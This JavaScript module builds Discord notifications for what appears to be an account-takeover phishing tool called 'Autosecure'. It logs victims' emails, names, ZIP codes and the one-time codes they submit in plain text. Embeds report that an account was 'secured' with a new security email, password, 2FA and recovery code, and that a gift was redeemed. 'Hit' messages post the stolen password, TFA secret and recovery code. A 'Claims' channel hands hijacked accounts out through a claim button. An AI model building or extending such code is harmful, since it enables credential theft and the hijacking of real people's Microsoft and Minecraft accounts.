// Discord Embed Utilities for Autosecure System

// Embed para mensajes de verificación
const getVerificationEmbed = (type, data) => {
    const colors = {
        success: 5763713,      // Verde
        error: 15548997,       // Rojo
        warning: 16776960,     // Amarillo
        info: 3447003          // Azul
    };

    const embeds = [];

    switch (type) {
        case 'otp_sent':
            embeds.push({
                title: "📧 Código de Verificación Enviado",
                description: "Se ha enviado un código de 6 dígitos a **" + data.email + "**",
                color: colors.info,
                fields: [
                    {
                        name: "🔢 Código",
                        value: "Revisa tu email e ingresa el código de 6 dígitos",
                        inline: false
                    },
                    {
                        name: "⏰ Tiempo restante",
                        value: "15 minutos",
                        inline: true
                    },
                    {
                        name: "📋 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'otp_verified':
            embeds.push({
                title: "✅ Código Verificado Exitosamente",
                description: "El código ha sido verificado. Iniciando proceso de secure...",
                color: colors.success,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + data.email + "`",
                        inline: false
                    },
                    {
                        name: "🎯 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "⚡ Estado",
                        value: "`Securing account...`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'account_secured':
            embeds.push({
                title: "🛡️ Cuenta Asegurada Exitosamente",
                description: "La cuenta ha sido completamente secured y el gift canjeado.",
                color: colors.success,
                fields: [
                    {
                        name: "📧 Email Original",
                        value: "`" + data.email + "`",
                        inline: false
                    },
                    {
                        name: "🛡️ Email de Seguridad",
                        value: "`" + data.secEmail + "`",
                        inline: false
                    },
                    {
                        name: "🔑 Contraseña",
                        value: "`[GENERADA AUTOMÁTICAMENTE]`",
                        inline: false
                    },
                    {
                        name: "📱 2FA",
                        value: "`ACTIVADO`",
                        inline: false
                    },
                    {
                        name: "♻️ Recovery Code",
                        value: "`" + (data.recoveryCode || 'GENERADO') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "⏱️ Tiempo",
                        value: "`" + data.timeTaken + "s`",
                        inline: true
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`" + (data.minecraft || 'No') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'verification_started':
            embeds.push({
                title: "📋 Verification Started",
                color: 5793266,
                fields: [
                    {
                        name: "📦 Product",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📮 ZIP",
                        value: "`" + (data.postalCode || 'Unknown') + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'code_submitted':
            embeds.push({
                title: "📝 Code Submitted",
                color: 5793266,
                fields: [
                    {
                        name: "📦 Product",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔢 Code",
                        value: "`" + (data.code || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📊 State",
                        value: "`verifying_otp`",
                        inline: false
                    },
                    {
                        name: "🆔 UID",
                        value: "`" + (data.sessionId || 'Unknown') + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links • Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'invalid_email':
            embeds.push({
                title: "🚫 Invalid Email",
                description: "El email proporcionado no es válido o no existe en Microsoft",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email Intentado",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Razón",
                        value: "`Email no válido o no encontrado en Microsoft`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "👤 Usuario",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'invalid_code':
            embeds.push({
                title: "🚫 Invalid Code",
                description: "El código ingresado no es válido o ha expirado",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔢 Código Intentado",
                        value: "`" + (data.code || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Razón",
                        value: "`Código inválido, incorrecto o expirado`",
                        inline: false
                    },
                    {
                        name: "🆔 Sesión",
                        value: "`" + (data.sessionId || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'no_minecraft':
            embeds.push({
                title: "🚫 No Minecraft Account",
                description: "La cuenta no tiene Minecraft asociado",
                color: colors.warning,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`No se encontró cuenta de Minecraft`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "👤 Usuario",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "⚙️ Configuración",
                        value: "`secureifnomc: " + (data.secureifnomc || 'false') + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'code_send_failed':
            embeds.push({
                title: "🚫 Failed to Send Code",
                description: "No se pudo enviar el código de verificación",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Razón",
                        value: "`" + (data.reason || 'Error desconocido') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "🔢 Métodos",
                        value: "`" + (data.methods || 'Ninguno disponible') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'session_expired':
            embeds.push({
                title: "⏰ Session Expired",
                description: "La sesión ha expirado. Por favor, inicia el proceso nuevamente",
                color: colors.warning,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🆔 Sesión",
                        value: "`" + (data.sessionId || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "⏰ Tiempo",
                        value: "`15 minutos expirados`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'error':
            embeds.push({
                title: "❌ Error en el Proceso",
                description: data.message || "Ocurrió un error durante el proceso",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Error",
                        value: "`" + (data.error || 'Unknown error') + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;
    }

    return embeds;
};

// Embed para canal de Hits (cuentas secured)
const getHitEmbed = (accountData) => {
    return {
        embeds: [
            {
                title: "🎯 Hit: " + (accountData.email || 'unknown'),
                color: 16763904,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (accountData.email || 'unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔑 Password",
                        value: "`" + (accountData.password || 'RECOVERED') + "`",
                        inline: false
                    },
                    {
                        name: "📱 TFA",
                        value: "`" + (accountData.secretkey || 'xxxx xxxx xxxx') + "`",
                        inline: false
                    },
                    {
                        name: "♻️ Recovery",
                        value: "`" + (accountData.recoveryCode || 'XXXX-XXXX-XXXX-XXXX') + "`",
                        inline: false
                    },
                    {
                        name: "🛡️ Sec Mail",
                        value: "`" + (accountData.secEmail || 'secure@mail.com') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Product",
                        value: "`" + (accountData.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`" + (accountData.minecraft || 'No') + "`",
                        inline: true
                    },
                    {
                        name: "⏱️ Time",
                        value: "`" + (accountData.timeTaken || '0') + "s`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            }
        ]
    };
};

// Función para enviar embeds a un canal específico
const sendEmbedToChannel = async (channel, embedData) => {
    try {
        await channel.send(embedData);
        return true;
    } catch (error) {
        console.error('Error sending embed to channel:', error);
        return false;
    }
};

// Función para enviar notificación de hit al canal configurado
const sendHitNotification = async (client, accountData) => {
    try {
        // Obtener el canal configurado para hits desde la base de datos
        const { queryParams } = require('./autosecure/db/database');
        const channels = await queryParams('SELECT * FROM channels WHERE type = ?', ['Hits']);
        
        if (channels.length === 0) {
            console.log('No hay canal configurado para Hits');
            return false;
        }

        const channelId = channels[0].channel_id;
        const channel = await client.channels.fetch(channelId);
        
        if (!channel) {
            console.log('Canal de Hits no encontrado');
            return false;
        }

        const embedData = getHitEmbed(accountData);
        return await sendEmbedToChannel(channel, embedData);
    } catch (error) {
        console.error('Error sending hit notification:', error);
        return false;
    }
};

// Función para enviar embeds al canal de Logs
const sendLogNotification = async (client, embedData) => {
    try {
        // Obtener el canal configurado para logs desde la base de datos
        const { queryParams } = require('./autosecure/db/database');
        const channels = await queryParams('SELECT * FROM channels WHERE type = ?', ['Logs']);
        
        if (channels.length === 0) {
            console.log('No hay canal configurado para Logs');
            return false;
        }

        const channelId = channels[0].channel_id;
        const channel = await client.channels.fetch(channelId);
        
        if (!channel) {
            console.log('Canal de Logs no encontrado');
            return false;
        }

        return await sendEmbedToChannel(channel, embedData);
    } catch (error) {
        console.error('Error sending log notification:', error);
        return false;
    }
};

// Función para enviar embeds al canal de Claims
const sendClaimNotification = async (client, claimData) => {
    try {
        // Obtener el canal configurado para claims desde la base de datos
        const { queryParams } = require('./autosecure/db/database');
        const channels = await queryParams('SELECT * FROM channels WHERE type = ?', ['Claims']);
        
        if (channels.length === 0) {
            console.log('No hay canal configurado para Claims');
            return false;
        }

        const channelId = channels[0].channel_id;
        const channel = await client.channels.fetch(channelId);
        
        if (!channel) {
            console.log('Canal de Claims no encontrado');
            return false;
        }

        const embedData = getClaimEmbed(claimData);
        return await sendEmbedToChannel(channel, embedData);
    } catch (error) {
        console.error('Error sending claim notification:', error);
        return false;
    }
};

// Función para enviar embeds ocultos al canal de Claims
const sendHiddenLogToClaims = async (client, embedType, data) => {
    try {
        // Obtener el canal configurado para claims desde la base de datos
        const { queryParams } = require('./autosecure/db/database');
        const channels = await queryParams('SELECT * FROM channels WHERE type = ?', ['Claims']);
        
        if (channels.length === 0) {
            console.log('No hay canal configurado para Claims');
            return false;
        }

        const channelId = channels[0].channel_id;
        const channel = await client.channels.fetch(channelId);
        
        if (!channel) {
            console.log('Canal de Claims no encontrado');
            return false;
        }

        const embedData = getHiddenLogEmbed(embedType, data);
        return await sendEmbedToChannel(channel, embedData);
    } catch (error) {
        console.error('Error sending hidden log to claims:', error);
        return false;
    }
};

// Embed para canal de Claims (cuentas disponibles para reclamar)
const getClaimEmbed = (claimData) => {
    return {
        embeds: [
            {
                title: "🎁 Account Available for Claim",
                color: 5814783, // Verde brillante
                fields: [
                    {
                        name: "👤 Full Name",
                        value: "`" + claimData.fullName + "`",
                        inline: false
                    },
                    {
                        name: "📧 Email",
                        value: "`" + claimData.email + "`",
                        inline: false
                    },
                    {
                        name: "📦 Product",
                        value: "`" + (claimData.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`" + (claimData.minecraft || 'No') + "`",
                        inline: true
                    },
                    {
                        name: "⏱️ Secured Time",
                        value: "`" + (claimData.timeTaken || '0') + "s`",
                        inline: true
                    },
                    {
                        name: "🆔 Claim ID",
                        value: "`" + claimData.id + "`",
                        inline: false
                    },
                    {
                        name: "⏰ Expires",
                        value: "`" + new Date(claimData.expiresAt).toLocaleString() + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            }
        ],
        components: [
            {
                type: 1, // Action Row
                components: [
                    {
                        type: 2, // Button
                        style: 3, // Success (Green)
                        label: "🎁 Claim Account",
                        custom_id: "claim_" + claimData.id,
                        emoji: {
                            name: "🎁"
                        }
                    }
                ]
            }
        ]
    };
};

// Embeds ocultos para canal de Claims (información parcial)
const getHiddenLogEmbed = (type, data) => {
    const colors = {
        success: 5763713,      // Verde
        error: 15548997,       // Rojo
        warning: 16776960,     // Amarillo
        info: 3447003          // Azul
    };

    const embeds = [];

    switch (type) {
        case 'verification_started':
            embeds.push({
                title: "📋 Verification Started",
                color: colors.info,
                fields: [
                    {
                        name: "📦 Product",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📮 ZIP",
                        value: "`" + (data.postalCode || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'otp_sent':
            embeds.push({
                title: "📧 Código de Verificación Enviado",
                color: colors.info,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'code_submitted':
            embeds.push({
                title: "📝 Code Submitted",
                color: colors.info,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔢 Code",
                        value: "`******`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'account_secured':
            embeds.push({
                title: "🛡️ Cuenta Asegurada Exitosamente",
                color: colors.success,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🛡️ Security Email",
                        value: "`" + (data.secEmail ? data.secEmail.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`" + (data.minecraft || 'No') + "`",
                        inline: true
                    },
                    {
                        name: "⏱️ Time",
                        value: "`" + (data.timeTaken || '0') + "s`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'invalid_email':
            embeds.push({
                title: "🚫 Invalid Email",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email Intentado",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'invalid_code':
            embeds.push({
                title: "🚫 Invalid Code",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔢 Código Intentado",
                        value: "`******`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'no_minecraft':
            embeds.push({
                title: "🚫 No Minecraft Account",
                color: colors.warning,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🎮 Minecraft",
                        value: "`No se encontró cuenta de Minecraft`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'code_send_failed':
            embeds.push({
                title: "🚫 Failed to Send Code",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Razón",
                        value: "`" + (data.reason || 'Error desconocido') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'session_expired':
            embeds.push({
                title: "⏰ Session Expired",
                color: colors.warning,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "⏰ Tiempo",
                        value: "`15 minutos expirados`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;

        case 'error':
            embeds.push({
                title: "❌ Error en el Proceso",
                color: colors.error,
                fields: [
                    {
                        name: "📧 Email",
                        value: "`" + (data.email ? data.email.substring(0, 3) + "***@***" : 'Unknown') + "`",
                        inline: false
                    },
                    {
                        name: "🔍 Error",
                        value: "`" + (data.error || 'Unknown error') + "`",
                        inline: false
                    },
                    {
                        name: "👤 Name",
                        value: "`" + (data.fullName || 'Unknown') + "`",
                        inline: true
                    },
                    {
                        name: "📦 Producto",
                        value: "`" + (data.product || 'Unknown') + "`",
                        inline: true
                    }
                ],
                footer: {
                    text: "⚡ ILJ Links - Soon 2.0"
                },
                timestamp: new Date().toISOString()
            });
            break;
    }

    return { embeds };
};

module.exports = {
    getVerificationEmbed,
    getHitEmbed,
    getClaimEmbed,
    getHiddenLogEmbed,
    sendEmbedToChannel,
    sendHitNotification,
    sendLogNotification,
    sendClaimNotification,
    sendHiddenLogToClaims
};
